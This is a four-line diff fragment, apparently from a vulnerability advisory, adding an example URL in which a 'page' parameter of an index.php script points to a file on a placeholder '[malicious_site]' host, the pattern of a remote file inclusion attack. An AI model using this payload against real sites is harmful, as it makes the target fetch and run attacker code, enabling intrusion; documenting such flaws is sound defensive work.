@@ -1,0 +1,4 @@
+
+example:
+
+http://www.example.com/order/index.php?page=http://[malicious_site]/file
